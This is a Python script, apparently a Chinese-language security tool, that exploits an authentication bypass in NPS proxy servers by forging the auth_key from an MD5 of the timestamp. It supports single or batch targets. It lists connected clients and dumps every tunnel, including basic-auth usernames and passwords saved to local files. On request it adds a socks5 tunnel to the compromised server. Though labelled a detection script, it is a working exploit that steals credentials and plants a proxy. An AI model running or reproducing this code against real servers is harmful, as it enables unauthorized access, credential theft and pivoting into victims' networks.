import hashlib
import json
import os
import sys
import time

import requests
import urllib3

urllib3.disable_warnings()

headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:103.0) Gecko/20100101 Firefox/103.0",
           "Accept": "application/json, text/javascript, */*; q=0.01",
           "Accept-Language": "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2",
           "Accept-Encoding": "gzip, deflate", "Content-Type": "application/x-www-form-urlencoded",
           "X-Requested-With": "XMLHttpRequest"}


class NPS:
    def __init__(self, target, search_mode):
        self.url = self.deal_target(target)
        self.search_mode = search_mode

    def deal_target(self, target):
        if "http" not in target:
            host = "http://" + target
        else:
            host = target
        URL = host.split("//")[0] + "//" + host.split("//")[1].split("/")[0]
        return URL

    @staticmethod
    def get_parameter(self):
        """获取auth_key及timestamp"""
        timestamp = int(time.time())
        m = hashlib.md5()
        m.update(str(int(timestamp)).encode("utf8"))
        auth_key = m.hexdigest()
        return auth_key, timestamp

    def get_client(self):
        """获取客户端"""
        auth_key, timestamp = self.get_parameter(self)
        url1 = self.url + "/client/list"
        data = {"search": '', "order": "asc", "offset": "0", "limit": "1000",
                "auth_key": auth_key, "timestamp": timestamp}
        try:
            res = requests.post(url1, headers=headers, data=data, verify=False, timeout=6)
            dict_date = json.loads(res.content)
            count = dict_date['total']
            for i in range(count):
                rows = dict_date['rows'][i]
                client_id = rows['Id']
                client_Addr = rows['Addr']
                client_IsConnect = rows['IsConnect']
                Remark = rows['Remark']
                Status = rows['Status']
                print(f"客户端ID:{client_id} 客服端地址:{client_Addr} 状态:{Status} 客户端状态:{client_IsConnect} 备注:{Remark}")
                name = self.url.split('//')[1].replace(':', '_').replace("/", '')
                if not os.path.exists("result"):
                    os.mkdir("result")
                with open(f"result/{name}.txt", "a", encoding="utf-8") as f:
                    f.write(f"客户端ID:{client_id} 客服端地址:{client_Addr} 状态:{Status} 客户端状态:{client_IsConnect} 备注:{Remark}\n")
            print("-" * 100)
            return True
        except Exception as e:
            error = str(e.args[0])
            if "由于目标计算机积极拒绝" in error or "HTTPConnectionPool" in error:
                print("目标地址访问失败。")
            elif "Expecting value" in error:
                print("nps未授权访问漏洞已修复。")
            else:
                print(f"发生其他错误：{error}")
            print("-" * 100 + "\n")
            return False

    def get_tunnel(self, type):
        """获取代理隧道"""
        auth_key, timestamp = self.get_parameter(self)
        url = self.url + "/index/gettunnel"
        data = {"offset": "0", "limit": "1000", "type": type, "client_id": '', "search": '',
                "auth_key": auth_key, "timestamp": timestamp}
        res = requests.post(url, headers=headers, data=data, verify=False)
        dict_date = json.loads(res.content)
        count = dict_date['total']
        for i in range(count):
            rows = dict_date['rows'][i]
            Port = rows['Port']
            Mode = rows['Mode']
            Addr = rows['Client']['Addr']
            client_id = rows['Client']['Id']
            Status = rows['Client']['Status']
            IsConnect = rows['Client']['IsConnect']
            Basic_user = rows['Client']['Cnf']['U']
            Basic_pass = rows['Client']['Cnf']['P']
            Remark = rows['Remark']
            Target = rows['Target']['TargetStr']

            print(f"客户端ID:{client_id} 模式:{Mode} 端口:{Port} 客服端地址:{Addr} 目标地址:{Target} 状态:{Status} 客服端状态:{IsConnect} "
                  f"认证用户名:{Basic_user} 认证密码:{Basic_pass} 备注:{Remark}")
            name = self.url.split('//')[1].replace(':', '_').replace("/", '')
            with open(f"result/{name}.txt", "a", encoding="utf-8") as f:
                f.write(
                    f"客户端ID:{client_id} 模式:{Mode} 端口:{Port} 客服端地址:{Addr} 目标地址:{Target} 状态:{Status} 客服端状态:{IsConnect} 认证用户名:{Basic_user} 认证密码:{Basic_pass} 备注:{Remark}\n")

    def add_socks5(self, client_id, port):
        """添加sockes5隧道"""
        auth_key, timestamp = self.get_parameter(self)
        url1 = self.url + "/index/add"
        data = {"type": "socks5", "client_id": client_id, "remark": '', "port": port, "target": '', "local_path": '',
                "strip_pre": '', "password": '', "auth_key": auth_key, "timestamp": timestamp}
        res = requests.post(url1, headers=headers, data=data, verify=False)
        if '"status": 1' in res.text:
            print("添加socks5代理成功！")
            print("-" * 100)
            self.get_tunnel("socks5")  # 输出添加后的socks5代理列表
            print("-" * 100)
            return True
        elif "未找到客户端" in res.text:
            print("添加代理失败，客服端ID错误，请重新添加。")
            return False
        elif "The port cannot" in res.text:
            print("添加代理失败，端口被占用，请重新添加。")
            return False
        else:
            return False

    def run(self):
        print(f"测试：{url}")
        print("-" * 100)
        is_con = self.get_client()
        if not is_con:
            pass
        else:
            mode_list = ['tcp', 'udp', 'socks5', 'httpProxy', 'secret', 'p2p', 'file']
            for mode in mode_list:
                self.get_tunnel(mode)
            print("-" * 100 + "\n")
            if self.search_mode == "single":
                is_add = input("是否添加socks5代理(y/N):")
                if is_add == 'y' or is_add == 'Y':
                    while True:
                        info = input("请输入客户端ID及端口(2 4444):")
                        client_id = info.split(" ")[0]
                        port = info.split(" ")[1]
                        is_suss = self.add_socks5(client_id, port)
                        if is_suss:
                            break


def banner():
    print(r"""
  _   _             _    _                   _   _                _             _    _____                 
 | \ | |           | |  | |                 | | | |              (_)           | |  / ____|                
 |  \| |_ __  ___  | |  | |_ __   __ _ _   _| |_| |__   ___  _ __ _ _______  __| | | (___   ___ __ _ _ __  
 | . ` | '_ \/ __| | |  | | '_ \ / _` | | | | __| '_ \ / _ \| '__| |_  / _ \/ _` |  \___ \ / __/ _` | '_ \ 
 | |\  | |_) \__ \ | |__| | | | | (_| | |_| | |_| | | | (_) | |  | |/ /  __/ (_| |  ____) | (_| (_| | | | |
 |_| \_| .__/|___/  \____/|_| |_|\__,_|\__,_|\__|_| |_|\___/|_|  |_/___\___|\__,_| |_____/ \___\__,_|_| |_|
       | |                                                                                                 
       |_|                                                                                                                                                                                          
    nps未授权访问漏洞检测脚本 v1.1          by:ifory                                        
""")


if __name__ == '__main__':
    banner()
    try:
        parameter = sys.argv[1]
        if parameter == "-t":
            url = sys.argv[2]
            NPS(url, "single").run()
        elif parameter == "-f":
            with open(f"{sys.argv[2]}", 'r', encoding='utf-8') as f:
                for key in f.readlines():
                    url = key.strip()
                    NPS(url, "batch").run()
        else:
            print("Help: -t 目标URL\n      -f 从txt文件中导入URL批量查询")
    except IndexError:
        print("Help: -t 目标URL\n      -f 从txt文件中导入URL批量查询")